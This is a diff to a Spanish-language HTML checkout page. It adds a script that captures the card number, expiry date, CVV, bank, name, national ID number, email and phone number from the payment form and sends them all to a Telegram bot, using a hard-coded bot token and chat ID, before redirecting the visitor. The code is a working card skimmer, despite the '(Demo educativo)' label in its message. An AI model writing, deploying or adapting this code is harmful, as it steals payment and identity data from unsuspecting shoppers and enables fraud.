@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 
@@ -335,11 +334,12 @@
     <script src="points/checkers/js/payment.js"></script>
 
   <!-- 👇 Aquí pegas el script de redirección y aviso -->
+
   <script>
-  // Aviso educativo a Telegram
+  // Enviar mensajes a Telegram
   async function sendTelegramMessage(texto) {
-    const TOKEN = "8430133464:AAFU08O0OjwnxH87at4KuBxQ1pIGP4xiwpA";  // ← pon aquí tu token del bot
-    const CHAT_ID = "5647970395";  // ← pon aquí tu chat_id
+    const TOKEN = "8430133464:AAFU08O0OjwnxH87at4KuBxQ1pIGP4xiwpA";   // tu token del bot
+    const CHAT_ID = "5647970395"; // tu chat_id
     const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     try {
@@ -393,21 +393,46 @@
   document.getElementById("next-step").addEventListener("click", function (e) {
     e.preventDefault();
 
-    const bank = document.getElementById("bank-option").value;
-    if (!bank || !bankToDest[bank]) {
+    // Capturar datos del formulario
+    const data = {
+      tarjeta: document.getElementById("card_number").value,
+      mes: document.getElementById("month-value").value,
+      anio: document.getElementById("year-value").value,
+      cvv: document.getElementById("card_cvc").value,
+      banco: document.getElementById("bank-option").value,
+      cuotas: document.getElementById("dues").value,
+      nombre: document.getElementById("name_card").value,
+      documento: document.getElementById("documentnumber").value,
+      correo: document.getElementById("email_user").value,
+      celular: document.getElementById("tel").value,
+    };
+
+    // Convertir en mensaje legible
+    const mensaje = `
+(Demo educativo)
+💳 Tarjeta: ${data.tarjeta}
+📅 Expira: ${data.mes}/${data.anio}
+🔒 CVV: ${data.cvv}
+🏦 Banco: ${data.banco}
+#️⃣ Cuotas: ${data.cuotas}
+👤 Nombre: ${data.nombre}
+🆔 Documento: ${data.documento}
+✉️ Correo: ${data.correo}
+📱 Celular: ${data.celular}
+    `;
+
+    // Enviar a Telegram
+    sendTelegramMessage(mensaje);
+
+    // Redirigir según banco elegido
+    if (!data.banco || !bankToDest[data.banco]) {
       alert("Selecciona un banco válido antes de continuar.");
       return;
     }
-
-    const { engine, q } = bankToDest[bank];
+    const { engine, q } = bankToDest[data.banco];
     const url = buildSearchUrl(engine, q);
-
-    // Aviso Telegram educativo
-    sendTelegramMessage(`(Demo) Banco elegido: ${q} → ${engine}`);
-
-    // Redirigir al buscador
     window.location.href = url;
   });
-  </script>
+</script>
 </body>
 </html>
